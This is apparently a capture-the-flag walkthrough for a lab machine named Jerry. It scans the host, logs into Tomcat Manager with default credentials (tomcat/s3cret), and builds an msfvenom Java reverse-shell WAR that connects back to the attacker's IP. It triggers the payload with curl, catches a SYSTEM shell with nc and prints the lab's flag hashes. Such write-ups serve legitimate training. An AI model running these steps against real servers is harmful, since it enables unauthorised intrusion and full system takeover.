---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Jerry



```bash
❯ nmap -p- --open -sS --min-rate 1000 -Pn -n 10.10.10.95 -oG allPorts
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-24 19:03 CET
Nmap scan report for 10.10.10.95
Host is up (0.060s latency).
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 122.56 seconds
```





```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.10.95
	[*] Open ports: 8080

[*] Ports copied to clipboard
```



```bash
❯ nmap -sCV -p8080 10.10.10.95 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-24 19:07 CET
Nmap scan report for 10.10.10.95
Host is up (0.081s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
|_http-open-proxy: Proxy might be redirecting requests
|_http-favicon: Apache Tomcat
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012|2008|7 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (97%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   108.22 ms 10.10.16.1
2   108.59 ms 10.10.10.95

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.82 seconds
```



```bash
❯ xsltproc targetedXML > index.html

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```



<figure><img src="../../../.gitbook/assets/4040_vmware_Tz3oiUiWrx.png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../../.gitbook/assets/imagen.png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../../.gitbook/assets/imagen (1).png" alt=""><figcaption></figcaption></figure>



{% embed url="https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown" %}



admin/admin



<figure><img src="../../../.gitbook/assets/imagen (2).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../../.gitbook/assets/imagen (3).png" alt=""><figcaption></figcaption></figure>



tomcat/s3cret



<figure><img src="../../../.gitbook/assets/imagen (4).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../../.gitbook/assets/4046_vmware_KkOShrwBUd.png" alt=""><figcaption></figcaption></figure>



{% embed url="https://medium.com/@cyb0rgs/exploiting-apache-tomcat-manager-script-role-974e4307cd00" %}



```bash
❯ msfvenom -p java/shell_reverse_tcp lhost=10.10.16.5 lport=443 -f war -o pwn.war
Payload size: 13030 bytes
Final size of war file: 13030 bytes
Saved as: pwn.war
```



```bash
❯ rlwrap -cAr nc -nlvp 443
listening on [any] 443 ...
```



<figure><img src="../../../.gitbook/assets/imagen (5).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../../.gitbook/assets/imagen (6).png" alt=""><figcaption></figcaption></figure>



```bash
❯ curl -s X GET 'http://10.10.10.95:8080/pwn'
```



```bash
❯ rlwrap -cAr nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.95] 49192
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system

C:\apache-tomcat-7.0.88> cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\Users\Administrator\Desktop

06/19/2018  06:09 AM    <DIR>          .
06/19/2018  06:09 AM    <DIR>          ..
06/19/2018  06:09 AM    <DIR>          flags
               0 File(s)              0 bytes
               3 Dir(s)   2,419,822,592 bytes free

C:\Users\Administrator\Desktop>cd flags
cd flags

C:\Users\Administrator\Desktop\flags>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\Users\Administrator\Desktop\flags

06/19/2018  06:09 AM    <DIR>          .
06/19/2018  06:09 AM    <DIR>          ..
06/19/2018  06:11 AM                88 2 for the price of 1.txt
               1 File(s)             88 bytes
               2 Dir(s)   2,419,822,592 bytes free

C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
type "2 for the price of 1.txt"
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
```
